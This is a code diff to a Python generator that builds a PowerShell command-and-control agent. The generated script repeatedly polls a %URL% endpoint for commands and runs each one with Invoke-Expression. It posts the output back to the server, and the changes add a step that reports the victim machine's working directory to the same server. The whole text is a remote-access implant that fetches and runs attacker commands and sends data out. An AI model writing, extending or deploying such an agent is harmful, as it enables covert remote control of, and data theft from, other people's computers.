@@ -5,14 +5,19 @@ def generate(url, frequency):
     $ProgressPreference = 'SilentlyContinue'
     $frequency = %SLEEP%
     $post = ''
+    $pwd = Get-Location
+
+    Invoke-RestMethod -Uri %URL%/pwd -Method POST -Body $pwd -ContentType 'text/plain; charset=utf-8'
+
     while ($true)
     {
         Start-Sleep -Seconds $frequency
-        $cmd = Invoke-WebRequest '%URL%'
+        $cmd = Invoke-WebRequest -Method POST '%URL%/get'
         if ($cmd.Content -eq 'exit-agent') { break }
         if ($cmd.Content -like '*set-frequency*') { $frequency = $cmd.Content.replace("set-frequency ", ""); continue }
         if ($cmd.Content -eq '') { continue }
 
+        Invoke-RestMethod -Uri %URL%/pwd -Method POST -Body $pwd -ContentType 'text/plain; charset=utf-8'
         $result = Invoke-Expression $cmd
         
         if ($result -is [string]) { $post = $result }
@@ -24,7 +29,7 @@ def generate(url, frequency):
             }
         }
 
-        Invoke-RestMethod -Uri %URL% -Method POST -Body $post -ContentType 'text/plain; charset=utf-8'
+        Invoke-RestMethod -Uri %URL%/post -Method POST -Body $post -ContentType 'text/plain; charset=utf-8'
         $post = ''
     }
     """
